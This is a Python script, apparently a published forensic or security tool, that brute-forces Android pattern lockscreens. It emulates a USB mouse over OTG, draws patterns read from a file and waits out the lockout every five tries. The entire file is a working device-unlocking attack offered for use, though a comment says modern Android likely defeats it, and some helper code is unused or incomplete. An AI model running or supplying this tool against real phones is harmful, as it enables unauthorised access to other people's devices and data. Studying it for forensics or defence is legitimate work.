#!/usr/bin/python3
# Script to bruteforce a lockscreen emulating mousemovements via OTG.
# Should not work on modern Android due to lockscreen timemouts increasing.
#
# https://github.com/magpol
import time
import sys
from zero_hid import Mouse
from zero_hid import Keyboard, KeyCodes
from zero_hid.hid import keycodes

k = Keyboard()
m = Mouse()

POINTS = [(0, 0), (250, 750), (500, 750), (800, 750), (250, 1050), (500, 1050), (800, 1050), (250, 1350), (500, 1350),
          (800, 1350)]

MAX_MOVEMENT = 50
MAX_ATTEMPTS = 5
MAX_ATTEMPTS_TIMEOUT = 32
current_position = (0, 0)


def calculate_pixel_difference(point1, point2):
    x1, y1 = POINTS[point1 - 1]
    x2, y2 = POINTS[point2 - 1]

    move_to_point(point1)
    move_to_point(point2)
    time.sleep(1)

def move_mouse_to_point(x, y, avoid_point=None):
    global current_position
    relative_x = x - current_position[0]
    relative_y = y - current_position[1]

    if relative_x == 0 and relative_y == 0:
        return

    if avoid_point is not None:
        avoid_x, avoid_y = POINTS[avoid_point - 1]
        distance_to_avoid = ((current_position[0] - avoid_x) ** 2 + (current_position[1] - avoid_y) ** 2) ** 0.5

        if distance_to_avoid < 100 and distance_to_avoid > 0:
            ratio = 100 / distance_to_avoid
            relative_x += (current_position[0] - avoid_x) * (1 - ratio)
            relative_y += (current_position[1] - avoid_y) * (1 - ratio)

    move_mouse_in_chunks(relative_x, relative_y)
    current_position = (x, y)

def move_mouse_in_chunks(movements_x, movements_y, avoid_point=None):
    total_distance = (movements_x ** 2 + movements_y ** 2) ** 0.5

    if total_distance == 0:
        return

    chunks = int(total_distance / MAX_MOVEMENT)
    if chunks == 0:
        chunks = 1

    chunk_x = movements_x / chunks
    chunk_y = movements_y / chunks

    for _ in range(chunks):
        m.move(int(chunk_x), int(chunk_y))
        movements_x -= chunk_x
        movements_y -= chunk_y

        if avoid_point is not None:
            avoid_x, avoid_y = POINTS[avoid_point - 1]
            distance_to_avoid = ((current_position[0] - avoid_x) ** 2 + (current_position[1] - avoid_y) ** 2) ** 0.5

            if distance_to_avoid < 100:
                ratio = 100 / distance_to_avoid
                m.move(int((avoid_x - current_position[0]) * (1 - ratio)), int((avoid_y - current_position[1]) * (1 - ratio)))

        time.sleep(0.1)

    m.move(int(movements_x), int(movements_y))
    time.sleep(0.1)


def move_to_point(point):
    global current_position
    x, y = POINTS[point]

    # Ensure we don't go too close to point 5
    if point != 5:
        move_mouse_to_point(x, y, avoid_point=5)
        current_position = (x, y)
        m.left_click(release=False)
        time.sleep(1)
    else:
        move_mouse_to_point(x, y)
        current_position = (x, y)
        m.left_click(release=False)
        time.sleep(1)



def reset_mouse_pointer():
    global current_position
    for _ in range(10):
        m.move(-120, -120)
    current_position = (0, 0)
    time.sleep(1)


if __name__ == "__main__":
    print(f"HID Bruteforcer v1.0 - https://github.com/magpol")
    if len(sys.argv) != 2:
        print("Usage: python hid_bruteforce.py INPUTFILE")
        sys.exit(1)
    if len(sys.argv[1]) == 1:
        reset_mouse_pointer()
        move_to_point(int(sys.argv[1]))
        sys.exit(1)

    filename = sys.argv[1]

    try:
        with open(filename, "r") as file:
            lines = file.readlines()

        if not lines:
            raise FileNotFoundError(f"Error: The pattern file '{filename}' is empty.")

        counter = 0
        reset_mouse_pointer()
        for line in lines:
            k.press([], KeyCodes.KEY_ENTER)
            k.press([], KeyCodes.KEY_ENTER)
            print(f"Testing: {line.strip()}")
            points = list(map(int, line.strip()))
            move_to_point(points[0])
            for i in range(0, len(points) - 1):
                calculate_pixel_difference(points[i], points[i + 1])
            m.release()
            time.sleep(1)
            reset_mouse_pointer()
            counter += 1
            print(f"Attempt {counter} of 5")

            if counter >= MAX_ATTEMPTS:
                k.press([], KeyCodes.KEY_ENTER)
                k.press([], KeyCodes.KEY_ENTER)
                print("Waiting 32 seconds...")
                time.sleep(MAX_ATTEMPTS_TIMEOUT)
                counter = 0
                reset_mouse_pointer()

    except FileNotFoundError:
        print(f"Error: The pattern file '{filename}'")
